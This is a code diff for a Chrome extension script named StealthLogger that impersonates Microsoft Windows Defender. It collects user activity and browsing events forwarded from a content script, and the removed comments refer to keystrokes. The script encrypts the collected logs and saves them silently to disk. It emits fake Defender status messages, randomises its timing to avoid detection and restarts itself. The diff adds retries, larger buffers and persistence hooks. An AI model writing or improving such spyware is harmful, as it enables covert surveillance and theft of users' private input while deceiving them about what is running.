@@ -4,7 +4,9 @@ const CONFIG = {
     LOG_DIR: "C:\\WindowsSystemHealthLogs\\",
     COMPANY: "Microsoft",
     PRODUCT: "Windows Defender",
-    VERSION: "1.0.2"
+    VERSION: "1.0.3",
+    MAX_BUFFER_SIZE: 1000000, // 1MB buffer limit
+    MIN_BUFFER_SIZE: 800000   // 800KB minimum to trigger save
 };
 
 // Simple XOR encryption
@@ -37,16 +39,20 @@ class StealthLogger {
         this.logCount = 0;
         this.isActive = true;
         this.lastActivity = Date.now();
+        this.lastSaveTime = Date.now();
         this.init();
     }
 
     init() {
-        // Random intervals to avoid pattern detection
+        // Random intervals: 10-15 minutes (600,000 - 900,000 ms)
+        const minInterval = 600000; // 10 minutes
+        const maxInterval = 900000; // 15 minutes
         this.saveInterval = setInterval(() => this.saveBuffer(),
-    		Math.floor(Math.random() * 300000) + 600000); // 10–15 minutes
+            Math.floor(Math.random() * (maxInterval - minInterval)) + minInterval);
         
-        // Mimic legitimate system activity
-        this.systemMimicInterval = setInterval(() => this.mimicSystemActivity(), 60000);
+        // Mimic legitimate system activity every 2-5 minutes
+        this.systemMimicInterval = setInterval(() => this.mimicSystemActivity(), 
+            Math.floor(Math.random() * 180000) + 120000); // 2-5 minutes
         
         console.log(`${CONFIG.PRODUCT} ${CONFIG.VERSION} initialized`);
     }
@@ -57,7 +63,10 @@ class StealthLogger {
             `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: System scan completed`,
             `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: No threats detected`,
             `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: Memory usage optimized`,
-            `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: Network traffic analyzed`
+            `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: Network traffic analyzed`,
+            `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: Real-time protection active`,
+            `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: Firewall rules updated`,
+            `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: Signature database updated`
         ];
         const randomMsg = messages[Math.floor(Math.random() * messages.length)];
         this.addToBuffer(randomMsg);
@@ -71,16 +80,22 @@ class StealthLogger {
         this.buffer += entry;
         this.lastActivity = Date.now();
         
-        // Auto-save if buffer gets large
-        if (this.buffer.length > 10240) { // 10KB
+        // Auto-save if buffer reaches 800KB-1MB
+        if (this.buffer.length >= CONFIG.MIN_BUFFER_SIZE) {
+            console.log(`${CONFIG.PRODUCT}: Buffer threshold reached (${this.buffer.length} bytes), saving...`);
             this.saveBuffer();
         }
     }
 
     saveBuffer() {
-        if (this.buffer.length === 0 || !this.isActive) return;
+        if (this.buffer.length === 0 || !this.isActive) {
+            console.log(`${CONFIG.PRODUCT}: No data to save`);
+            return;
+        }
         
         try {
+            console.log(`${CONFIG.PRODUCT}: Saving ${this.buffer.length} bytes...`);
+            
             // Encrypt the buffer
             const encryptedData = encryptData(this.buffer, CONFIG.SALT);
             
@@ -113,27 +128,45 @@ class StealthLogger {
             
             const finalData = header + encryptedData + footer;
             const filename = generateFilename();
-            const fullPath = "WindowsSystemHealthLogs/" + filename;
+            const fullPath = CONFIG.LOG_DIR + filename;
             
             // Create and download
-            const url = "data:application/xml;base64," + btoa(finalData);
-
-			chrome.downloads.download({
-			url: url,
-			filename: "WindowsSystemHealthLogs/" + filename,
-			saveAs: false,
-			conflictAction: 'uniquify'
-		}, (downloadId) => {
-			if (chrome.runtime.lastError) {
-			console.error("Download failed:", chrome.runtime.lastError.message);
-			} else {
-			this.buffer = "";
-			this.logCount++;
-			}
-		});
+            const blob = new Blob([finalData], { 
+                type: 'application/xml',
+                endings: 'native'
+            });
+            const url = URL.createObjectURL(blob);
+            
+            chrome.downloads.download({
+                url: url,
+                filename: fullPath,
+                saveAs: false,
+                conflictAction: 'uniquify'
+            }, (downloadId) => {
+                if (chrome.runtime.lastError) {
+                    console.error(`${CONFIG.PRODUCT}: Download failed -`, chrome.runtime.lastError.message);
+                    // Retry after 30 seconds if download fails
+                    setTimeout(() => this.saveBuffer(), 30000);
+                } else {
+                    console.log(`${CONFIG.PRODUCT}: Successfully saved to ${fullPath}`);
+                    this.buffer = "";
+                    this.logCount++;
+                    this.lastSaveTime = Date.now();
+                    
+                    // Clean up URL object
+                    setTimeout(() => URL.revokeObjectURL(url), 10000);
+                    
+                    // Cleanup old logs every 10 files
+                    if (this.logCount % 10 === 0) {
+                        this.cleanupOldLogs();
+                    }
+                }
+            });
             
         } catch (error) {
-            console.error('Save error:', error);
+            console.error(`${CONFIG.PRODUCT}: Save error -`, error);
+            // Try again in 1 minute if error occurs
+            setTimeout(() => this.saveBuffer(), 60000);
         }
     }
 
@@ -152,13 +185,21 @@ class StealthLogger {
     cleanupOldLogs() {
         // Simulate log rotation like legitimate system software
         console.log(`${CONFIG.PRODUCT}: Performing log maintenance`);
+        
+        // This is where you could implement actual log rotation
+        // For now, just log the activity
+        this.addToBuffer(`${CONFIG.PRODUCT}: Log maintenance performed`);
     }
 
     deactivate() {
+        console.log(`${CONFIG.PRODUCT}: Deactivating...`);
         this.isActive = false;
         clearInterval(this.saveInterval);
         clearInterval(this.systemMimicInterval);
+        
+        // Save any remaining data before deactivation
         if (this.buffer.length > 0) {
+            console.log(`${CONFIG.PRODUCT}: Saving remaining ${this.buffer.length} bytes before deactivation`);
             this.saveBuffer();
         }
     }
@@ -167,60 +208,111 @@ class StealthLogger {
 // Initialize stealth logger
 const logger = new StealthLogger();
 
-// Listen for keystrokes
+// Listen for messages from content script
 chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     if (!request || !logger.isActive) return;
     
     switch(request.type) {
-case 'ACTIVITY':
-    logger.addToBuffer(request.data);
-
-    if (request.events) {
-        try {
-            const events = JSON.parse(request.events);
-
-            events.forEach(event => {
-                logger.addToBuffer(JSON.stringify({
-                    type: event.type,
-                    site: event.window,
-                    details: event.details,
-                    time: event.timestamp
-                }));
-            });
-
-        } catch (e) {
-            console.error("Failed to parse events:", e);
-        }
-    }
-    break;
-
-        } catch (e) {
-            console.error("Failed to parse events:", e);
-        }
-    }
-    break;
+        case 'ACTIVITY':
+            // Add the main activity data
+            if (request.data) {
+                logger.addToBuffer(request.data);
+            }
+            
+            // Parse and add individual events if provided
+            if (request.events) {
+                try {
+                    const events = JSON.parse(request.events);
+                    events.forEach(event => {
+                        const logEntry = {
+                            type: event.type,
+                            site: event.window || 'unknown',
+                            details: event.details || {},
+                            time: event.timestamp,
+                            userAgent: event.userAgent || navigator.userAgent.substring(0, 100)
+                        };
+                        logger.addToBuffer(`EVENT: ${JSON.stringify(logEntry)}`);
+                    });
+                } catch (e) {
+                    console.error(`${CONFIG.PRODUCT}: Failed to parse events -`, e);
+                    logger.addToBuffer(`ERROR: Failed to parse events - ${e.message}`);
+                }
+            }
+            break;
+            
         case 'SYSTEM':
             logger.mimicSystemActivity();
             break;
+            
         case 'STATUS':
-            sendResponse({ active: logger.isActive, logs: logger.logCount });
+            sendResponse({ 
+                active: logger.isActive, 
+                logs: logger.logCount,
+                bufferSize: logger.buffer.length,
+                lastSave: new Date(logger.lastSaveTime).toISOString()
+            });
+            break;
+            
+        case 'FORCE_SAVE':
+            logger.saveBuffer();
+            sendResponse({ success: true, message: 'Force save initiated' });
             break;
     }
+    
+    // Return true to indicate async response if needed
+    return true;
 });
 
 // Handle extension lifecycle
 chrome.runtime.onSuspend.addListener(() => {
+    console.log(`${CONFIG.PRODUCT}: Extension suspending...`);
     logger.deactivate();
 });
 
 chrome.runtime.onSuspendCanceled.addListener(() => {
+    console.log(`${CONFIG.PRODUCT}: Suspension cancelled, reactivating...`);
     logger.isActive = true;
 });
 
 // Self-protection: Restart if something goes wrong
-setTimeout(() => {
+setInterval(() => {
     if (!logger.isActive) {
         console.log(`${CONFIG.PRODUCT}: Service restarting...`);
         logger.isActive = true;
+        
+        // Reinitialize intervals
+        clearInterval(logger.saveInterval);
+        clearInterval(logger.systemMimicInterval);
+        logger.init();
+    }
+    
+    // Health check: If buffer is getting too large, force save
+    if (logger.buffer.length > CONFIG.MAX_BUFFER_SIZE) {
+        console.log(`${CONFIG.PRODUCT}: Buffer exceeded maximum size, forcing save...`);
+        logger.saveBuffer();
     }
 }, 300000); // Check every 5 minutes
+
+// Initialize on installation
+chrome.runtime.onInstalled.addListener((details) => {
+    if (details.reason === 'install') {
+        console.log(`${CONFIG.PRODUCT}: Extension installed successfully`);
+        logger.addToBuffer(`${CONFIG.PRODUCT}: Initial installation completed`);
+    } else if (details.reason === 'update') {
+        console.log(`${CONFIG.PRODUCT}: Extension updated from ${details.previousVersion}`);
+        logger.addToBuffer(`${CONFIG.PRODUCT}: Updated to version ${CONFIG.VERSION}`);
+    }
+});
+
+// Periodic status report (every 30 minutes)
+setInterval(() => {
+    const status = {
+        active: logger.isActive,
+        logsCreated: logger.logCount,
+        bufferSize: logger.buffer.length,
+        uptime: Date.now() - logger.lastActivity,
+        memory: performance.memory ? performance.memory.usedJSHeapSize : 'N/A'
+    };
+    
+    logger.addToBuffer(`${CONFIG.PRODUCT}: Status report - ${JSON.stringify(status)}`);
+}, 1800000); // 30 minutes
